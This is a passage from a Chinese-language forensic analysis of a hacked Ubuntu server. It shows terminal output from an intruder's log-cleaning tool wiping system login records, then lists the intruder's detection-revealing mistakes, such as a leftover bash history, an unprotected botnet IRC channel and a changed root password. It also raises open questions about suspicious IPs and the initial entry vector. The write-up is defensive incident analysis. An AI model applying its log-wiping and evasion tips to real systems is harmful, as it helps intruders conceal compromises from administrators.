<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/usr/lib/libsh#&nbsp;./hide&nbsp;+&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;Linux&nbsp;Hider&nbsp;v2.0&nbsp;by&nbsp;mave&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;enhanced&nbsp;by&nbsp;me!&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;[Shkupi&nbsp;Logcleaner]&nbsp;Removing&nbsp;+&nbsp;from&nbsp;the&nbsp;logs........&nbsp;.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;/var/log/messages&nbsp;&nbsp;...&nbsp;[done]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;/var/run/utmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;[done]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;/var/log/lastlog&nbsp;&nbsp;&nbsp;...&nbsp;[done]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;/var/log/wtmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;[done]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;*&nbsp;m&nbsp;i&nbsp;s&nbsp;s&nbsp;i&nbsp;o&nbsp;n&nbsp;&nbsp;a&nbsp;c&nbsp;c&nbsp;o&nbsp;m&nbsp;p&nbsp;l&nbsp;i&nbsp;s&nbsp;h&nbsp;e&nbsp;d&nbsp;*&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;p.h.e.e.r&nbsp;&nbsp;S.H.c.r.e.w&nbsp;</span></li></ol></pre>

<p></p>

<p>那么这个入侵者为什么还要把&rdquo;/var/log/&rdquo;目录全删除了呢,是不相信这个工具么?还是他特别害怕?</p>

<p>可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到：</p>

<p>1、忘记清除&rdquo;.bash_history&rdquo;文件</p>

<p>2、&ldquo;/var/log&rdquo;目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.</p>

<p>3、修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.</p>

<p>4、irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.</p>

<p>5、入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.</p>

<p>当然还有几个遗留的问题：</p>

<p>1、&rdquo;ssh ftp@62.101.251.166&Prime; 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?</p>

<p></p>

<pre><ol class="dp-xml"><li class="alt"><span><span>$&nbsp;dig&nbsp;+short&nbsp;-x&nbsp;62.101.251.166&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cA6FB653E.dhcp.bluecom.no.&nbsp;</span></li></ol></pre>

<p></p>

<p>2、跟83.18.74.235(manhattan.na.pl)的通讯内容是什么？</p>

<p>3、最重要的问题是他一开始是如何或得下系统的权限的？这个服务器运行的是Ubuntu 6.06 LTS，打了最新的补丁。可能入侵的途径：</p>

<p>*猜测root密码,不幸的是这个密码是强密码*</p>

<p>*未知的exploit*</p>

<p>*某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码.*</p>

